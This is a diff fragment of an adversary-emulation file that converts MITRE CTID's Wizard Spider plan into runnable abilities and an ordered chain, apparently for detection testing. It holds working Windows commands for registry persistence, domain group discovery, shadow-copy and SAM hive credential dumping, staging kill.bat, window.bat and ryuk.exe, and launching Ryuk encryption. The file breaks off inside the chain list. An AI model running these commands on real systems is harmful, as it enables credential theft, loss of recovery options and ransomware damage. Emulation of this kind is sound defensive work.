+      "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" -Force",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "1536bbcf-858e-44c2-95cb-ebd46d7434be",
+        "source_order": 27,
+        "procedure_step": "7.A.4",
+        "procedure_group": "procedure_persistence",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1069.002 - Wizard Spider Domain Group Discovery",
+      "name": "CTID - Wizard Spider - T1069.002 - Wizard Spider Domain Group Discovery",
+      "description": "Wizard Spider has used AdFind to enumerate domain computers, including the domain controller.",
+      "tactic": "discovery",
+      "tcode": "T1069.002",
+      "technique_name": "Permission Groups Discovery: Domain Groups",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "adfind -f \"(objectcategory=group)\"",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "46430565-f9e8-4580-b497-f5f561962d95",
+        "source_order": 28,
+        "procedure_step": "7.A.5",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1003.003 - Wizard Spider Create Volume Shadow Copy",
+      "name": "CTID - Wizard Spider - T1003.003 - Wizard Spider Create Volume Shadow Copy",
+      "description": "Wizard Spider uses vssadmin to create a volume shadow copy in order to collect the active directory database (ntds.dit). Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.",
+      "tactic": "credential-access",
+      "tcode": "T1003.003",
+      "technique_name": "OS Credential Dumping: NTDS",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"vssadmin.exe create shadow /for=C:\";",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "5746a074-1f51-4a96-8e69-f7eb81578f5e",
+        "source_order": 29,
+        "procedure_step": "8.A.1",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1003.003 - Wizard Spider Exfil Volume Shadow Copy",
+      "name": "CTID - Wizard Spider - T1003.003 - Wizard Spider Exfil Volume Shadow Copy",
+      "description": "Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share. Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Morgana-native operational simulation used because: unresolved source facts: vssadmin.shadow_copy.name.",
+      "tactic": "credential-access",
+      "tcode": "T1003.003",
+      "technique_name": "OS Credential Dumping: NTDS",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1003.003'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-030-t1003-003.txt'; $impactDir = Join-Path $simulationRoot 'impact-sandbox'; New-Item -ItemType Directory $impactDir -Force | Out-Null; 1..5 | ForEach-Object { Set-Content (Join-Path $impactDir \"sandbox-$_.txt\") 'original'; Set-Content (Join-Path $impactDir \"sandbox-$_.txt\") 'simulated-impact' }; Get-ChildItem $impactDir | Select-Object Name,Length; Write-Output '[SUCCESS] CTID simulation T1003.003 family=impact';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "05202302-6b80-4549-b3bb-2ead90c249a5",
+        "source_order": 30,
+        "procedure_step": "8.A.1",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unresolved source facts: vssadmin.shadow_copy.name"
+        ],
+        "simulation_family": "impact",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unresolved source facts: vssadmin.shadow_copy.name"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1003.002 - Wizard Spider Save Registry Hive",
+      "name": "CTID - Wizard Spider - T1003.002 - Wizard Spider Save Registry Hive",
+      "description": "Uses cmd.exe to execute reg.exe to save HKLM\\SYSTEM",
+      "tactic": "credential-access",
+      "tcode": "T1003.002",
+      "technique_name": "OS Credential Dumping: Security Account Manager",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"reg SAVE HKLM\\SYSTEM \\\\TSCLIENT\\X\\SYSTEM_HIVE\"",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "bb98782b-2519-4721-a723-b8f027b441d4",
+        "source_order": 31,
+        "procedure_step": "8.A.2",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads kill.bat",
+      "name": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads kill.bat",
+      "description": "Mounts share so Ryuk can encrypt lateral drives. Downloads kill.bat, which Ryuk has used for stopping services, disabling services and killing processes.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "ctid_wizard_spider_second_target_host"
+      ],
+      "required_assets": [],
+      "command": "cmd /c \"net use Z: \\\\#{ctid_wizard_spider_second_target_host}\\C$\";\ncmd /c \"copy \\\\TSCLIENT\\X\\kill.bat C:\\Users\\Public\\kill.bat\";",
+      "cleanup_command": "net use /delete Z: ;\nif (Test-Path \"C:\\Users\\Public\\kill.bat\") { rm C:\\Users\\Public\\kill.bat };",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "d9787a1d-0fd4-4776-a073-00423a33e7e2",
+        "source_order": 32,
+        "procedure_step": "9.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1489 - Wizard Spider Runs kill.bat",
+      "name": "CTID - Wizard Spider - T1489 - Wizard Spider Runs kill.bat",
+      "description": "Ryuk has called kill.bat for stopping services, disabling services and killing processes. Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories. Ryuk has stopped services related to anti-virus. This also covers T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
+      "tactic": "impact",
+      "tcode": "T1489",
+      "technique_name": "Service Stop",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"C:\\Users\\Public\\kill.bat\" 2> $null;\nexit 0;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "180eb3b8-1590-4b77-9b8c-7972c198f09e",
+        "source_order": 33,
+        "procedure_step": "9.A.2-3",
+        "procedure_group": "procedure_impact",
+        "cti_source": "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads window.bat",
+      "name": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads window.bat",
+      "description": "Downloads window.bat, which will use vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"copy \\\\TSCLIENT\\X\\window.bat C:\\Users\\Public\\window.bat\"",
+      "cleanup_command": "if (Test-Path \"C:\\Users\\Public\\window.bat\") { rm C:\\Users\\Public\\window.bat }",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "69b0a93e-3c71-42f5-8019-13289d9353b3",
+        "source_order": 34,
+        "procedure_step": "9.A.4",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1490 - Wizard Spider Runs window.bat",
+      "name": "CTID - Wizard Spider - T1490 - Wizard Spider Runs window.bat",
+      "description": "Ryuk has used vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.",
+      "tactic": "impact",
+      "tcode": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"C:\\Users\\Public\\window.bat\" 2> $null;\nexit 0;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "3f878fc6-d5b0-4c95-b022-88f0becbb61e",
+        "source_order": 35,
+        "procedure_step": "9.A.5",
+        "procedure_group": "procedure_impact",
+        "cti_source": "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads ryuk.exe",
+      "name": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads ryuk.exe",
+      "description": "Downloads ryuk.exe ransomware.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "cmd /c \"copy \\\\TSCLIENT\\X\\ryuk.exe C:\\Users\\Public\\ryuk.exe\"",
+      "cleanup_command": "if (Test-Path \"C:\\Users\\Public\\ryuk.exe\") { rm C:\\Users\\Public\\ryuk.exe }",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "06b694af-f503-44ca-bc3c-bd017f75ed89",
+        "source_order": 36,
+        "procedure_step": "10.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1486 - Wizard Spider Executes Ryuk Ransomware",
+      "name": "CTID - Wizard Spider - T1486 - Wizard Spider Executes Ryuk Ransomware",
+      "description": "Starts a notepad process and executes ryuk.exe ransomware. When Ryuk executes, it will first gain SeDebugPrivilege. Ryuk will then inject its own executable into a remote process, notepad.exe, via WriteProcessMemory and CreateRemoteThread WinAPI calls. Ryuk uses a symmetric key algorithm, AES256 to encrypt files. Note that the symmetric key is itself encrypted with RSA2048.",
+      "tactic": "command-and-control",
+      "tcode": "T1486",
+      "technique_name": "Data Encrypted for Impact",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Start-Process C:\\Windows\\System32\\notepad.exe;\ncmd /c \"C:\\Users\\Public\\ryuk.exe --encrypt --process-name notepad.exe\";",
+      "cleanup_command": null,
+      "operational_risk": "disrupt",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "cd16fcb6-e1f0-4e0f-bb83-2369516587f2",
+        "source_order": 37,
+        "procedure_step": "10.A.2-7",
+        "procedure_group": "procedure_impact",
+        "cti_source": "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Domain Controller",
+      "name": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Domain Controller",
+      "description": "End the RDP session to the Domain Controller. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine. Morgana-native operational simulation used because: unsupported source executor: proc.",
+      "tactic": "lateral-movement",
+      "tcode": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.001 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "95d6c92c-e328-4997-ae01-507b709dfa7b",
+        "source_order": 38,
+        "procedure_step": "10.A.7",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    }
+  ],
+  "chains": [
+    {
+      "name": "CTID - Wizard Spider - Canonical Emulation Flow",
+      "description": "Source-ordered Wizard Spider emulation flow. Self-contained source commands run directly; unavailable payload, C2, and executor dependencies use labeled operational simulations.",
+      "objective": "Emulate the documented multi-stage Wizard Spider intrusion flow to validate cross-tactic detection and response coverage.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "adversary:wizard-spider"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "Wizard Spider",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "scenario_id": "canonical",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/wizard_spider"
+      },
+      "plan_type": "full-emulation",
+      "adversary": "Wizard Spider",
+      "scenario_id": "canonical",
+      "scenario_name": "Canonical Emulation Flow",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-001-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Upload Agent Executable to Initial Target",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-002-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1078 - RDP Connection to Initial Target (Dorothy)",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-003-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1204.002 - Run Agent Executable for Initial Access",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-004-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1547.001 - Emotet Persistence",
+            "source_step": "2.A.1"
+          },
+          {
+            "id": "procedure-005-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - Emotet System Info Discovery",
+            "source_step": "3.A.1"
+          },
+          {
+            "id": "procedure-006-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1057 - Emotet Process Discovery",
+            "source_step": "3.A.2"
+          },
+          {
+            "id": "procedure-007-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Emotet Download Outlook Scraper DLL",
+            "source_step": "3.A.3"
+          },
+          {
+            "id": "procedure-008-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1552 - Emotet Scrape Email Content From Outlook",
+            "source_step": "3.A.4"
+          },
+          {
+            "id": "procedure-009-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1114.001 - Emotet Scrape Email Addresses from Outlook",
+            "source_step": "3.A.5"
+          },
+          {
+            "id": "procedure-010-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Initial Target",
+            "source_step": "3.A.5"
+          },
+          {
+            "id": "procedure-011-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Toto)",
+            "source_step": "4.A.1-2"
+          },
+          {
+            "id": "procedure-012-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Toto)",
+            "source_step": "4.A.3"
+          },
+          {
+            "id": "procedure-013-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery",
+            "source_step": "5.A.1"
+          },
+          {
+            "id": "procedure-014-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1007 - TrickBot System Service Discovery (systeminfo)",
+            "source_step": "5.A.2"
+          },
+          {
+            "id": "procedure-015-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1087.001 - TrickBot Local Account Discovery",
+            "source_step": "5.A.3"
+          },
+          {
+            "id": "procedure-016-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1087.002 - TrickBot Domain Account Discovery",
+            "source_step": "5.A.4"
+          },
+          {
+            "id": "procedure-017-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1016 - TrickBot System Network Configuration Discovery",
+            "source_step": "5.A.5"
+          },
+          {
+            "id": "procedure-018-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1049 - TrickBot System Network Connections Discovery",
+            "source_step": "5.A.6"
+          },
+          {
+            "id": "procedure-019-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery (net config)",
+            "source_step": "5.A.7"
+          },
+          {
+            "id": "procedure-020-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1482 - TrickBot Domain Trust Discovery",
+            "source_step": "5.A.8"
+          },
+          {
+            "id": "procedure-021-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1069 - TrickBot Permission Groups Discovery",
+            "source_step": "5.A.9"
+          },
+          {
+            "id": "procedure-022-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1558.003 - TrickBot Perform Kerberoasting",
+            "source_step": "6.A.1-2"
+          },
+          {
+            "id": "procedure-023-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Second Target (Toto)",
+            "source_step": "6.A.2"
+          },
+          {
+            "id": "procedure-024-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Prepare Tools for Ingress Tool Transfer (Wizard)",
+            "source_step": "7.A.1"
+          },
+          {
+            "id": "procedure-025-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Wizard)",
+            "source_step": "7.A.1-2"
+          },
+          {
+            "id": "procedure-026-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Wizard)",
+            "source_step": "7.A.3"
+          },
+          {
+            "id": "procedure-027-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1547.004 - Wizard Spider Registry Persistence",
+            "source_step": "7.A.4"
+          },
+          {
+            "id": "procedure-028-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1069.002 - Wizard Spider Domain Group Discovery",
+            "source_step": "7.A.5"
+          },
+          {
+            "id": "procedure-029-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.003 - Wizard Spider Create Volume Shadow Copy",
+            "source_step": "8.A.1"
+          },
+          {
+            "id": "procedure-030-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.003 - Wizard Spider Exfil Volume Shadow Copy",
+            "source_step": "8.A.1"
+          },
+          {
+            "id": "procedure-031-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.002 - Wizard Spider Save Registry Hive",
+            "source_step": "8.A.2"
+          },
+          {
+            "id": "procedure-032-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads kill.bat",
+            "source_step": "9.A.1"
+          },
+          {
+            "id": "procedure-033-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1489 - Wizard Spider Runs kill.bat",
+            "source_step": "9.A.2-3"
+          },
+          {
+            "id": "procedure-034-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads window.bat",
+            "source_step": "9.A.4"
+          },
+          {
+            "id": "procedure-035-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1490 - Wizard Spider Runs window.bat",
+            "source_step": "9.A.5"
+          },
+          {
+            "id": "procedure-036-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads ryuk.exe",
+            "source_step": "10.A.1"
+          },
+          {
+            "id": "procedure-037-1",
+            "type": "script",
